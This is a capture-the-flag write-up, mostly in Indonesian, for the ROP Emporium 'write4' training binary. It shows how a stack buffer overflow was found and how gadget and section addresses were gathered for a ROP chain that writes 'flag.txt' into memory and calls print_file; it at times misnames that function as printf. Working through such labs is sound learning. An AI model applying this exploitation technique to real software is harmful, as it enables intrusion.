# write4-writeup

**info :**

A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like "flag.txt") as the 1st argument.

sepertinya untuk mendapatkan flag, harus melakukan rop chain dengan memanggil printf() dengan string 'flag.txt' sebagai argumen pertama.

# analysis and step by step exploit

as usual awali analisis dengan gdb . 

**mencari nama fungsi yang tersedia**

```
pwndbg> info functions
```

daftar fungsi tersedia :
- main
- usefulFunctions
- usefulGadgets
- pwnme

**main** tidak memiliki hal menarik , ia hanya memanggil fungsi **pwnme()**

fungsi pwnme() adalah tempat input dilakukan. dan terindikasi memiliki kerentanan buffer overflow. 

```Assembly
   0x00007ffff7c008aa <+0>:     push   rbp
   0x00007ffff7c008ab <+1>:     mov    rbp,rsp
=> 0x00007ffff7c008ae <+4>:     sub    rsp,0x20 <- ukuran buffer tersedia di stack
   ............................................
   0x00007ffff7c00922 <+120>:   mov    edx,0x200 <- ukuran maksimal yang dibaca oleh fungsi read()
   0x00007ffff7c00927 <+125>:   mov    rsi,rax
   0x00007ffff7c0092a <+128>:   mov    edi,0x0
   0x00007ffff7c0092f <+133>:   call   0x7ffff7c00770 <read@plt>
```

buffer overflow ada di fungsi read() karena itu dapat membaca input sebanyak **0x200 byte** sedangkan ukuran buffer di stack hanya **0x20 byte** , ini maka jika aku memasukkan
input lebih dari 0x20.

itu tetap jadi input yang valid di program, namun input tersebut tidak lagi disimpan di stack tapi menimpa alamat memori lain di sekitar buffer seperti variabel
lain atau register. ini cukup berbahaya karena jika yang di timpa adalah return address maka valuenya akan berubah dan alur program akan rusak.

karena tujuan nya adalah melakukan rop chain maka aku bisa memanfaatkan buffer overflow ini. selanjutnya adalah me leak value dan alamat yang dibutuhkan.


NOTE : printf() hanya menerima alamat memory seperti pointer.

rencana : 
jadi aku harus menulis string flag.txt itu ke dalam binary lalu menggunakan alamat memorynya sebagai argumen pada fungsi printf. 

**menulis flag.txt ke binary**
sesuai instruksi dari rop emporium :  In this challenge we won't be using built-in functionality since that's too similar to the previous challenges, instead we'll be looking for gadgets that let us write a value to memory such as mov [reg], reg

aku harus mencari gadget yang melakukan mov [reg1],reg2 . apa ini? ini artinya memindahkan value reg2 ke alamat dari reg1. jika reg1 isinya alamat di binary aku bisa menulis apapun
disitu. 

ROPgadget tools :
```
└> ROPgadget --binary ./write4 | grep "mov"
```
aku menemukan kandidat terbaik
```Assembly
0x0000000000400628 : mov qword ptr [r14], r15 ; ret
```

selain itu aku juga harus mencari gadget yang melakukan pop r14 dan 15 untuk mengisi isinya. ini sangat mudah ditemukan.
```
└> ROPgadget --binary ./write4 | grep "pop r14"
```
```Assembly
0x0000000000400690 : pop r14 ; pop r15 ; ret
```

addr gadget mov (menulis string ke binary) : **0x400628**
addr pengisi register r14 dan r15 : **0x400690**

rop chain untuk menulis ke binary sudah ada, sekarang adalah mencari alamat print address nya, dan gadget rdi untuk memasukkan alamat string ke printf

```
└> ROPgadget --binary ./write4 | grep "rdi"
```
```Asemmbly
0x0000000000400693 : pop rdi ; ret
```

**mencari addr printf**
```
└> rabin2 -s write4 | grep print
```
```
4   0x00000510 0x00400510 GLOBAL FUNC   16       imp.print_file
```
pop rdi addr : **0x400693**
printf addr : **0x00400510**


**mencari bagian dari program yang kosong dan bisa di isi string**

berikut beberapa kandidat yang menarik :
```
└> readelf -S write4 | grep -E "\.(bss|data|rodata)"
  [15] .rodata           PROGBITS         00000000004006b0  000006b0
  [23] .data             PROGBITS         0000000000601028  00001028
  [24] .bss              NOBITS           0000000000601038  00001038
```

section bss address : **0x601038**
section data address : **0x601028**
section rodata address : **0x4006b0**

setelah semua data berhasilll , aku membuat [skrip python](solver.py) untuk melakukan exploit.



```
┌[rotalactf]-[LAPTOP-6QMID52F]-(write4)
└> python3  solve.py
[*] '/home/rotalactf/reno/pwn/rop-emporium/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process './write4': pid 14515
[*] Switching to interactive mode
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$
```
gokil done .

note : section tersebut harus kosong agar string yang kita masukkan tidak menimpa string lain. berikut adalah contoh jika aku mengambil alamat random (kosong dalam static): 

```
┌[rotalactf]-[LAPTOP-6QMID52F]-(write4)
└> python3  solve.py
[*] '/home/rotalactf/reno/pwn/rop-emporium/write4/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process './write4': pid 13885
[*] Switching to interactive mode
[*] Process './write4' stopped with exit code 1 (pid 13885)
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> Thank you!
Failed to open file: flag.txt\xe0rN\x9b\x8ez
[*] Got EOF while reading in interactive
```
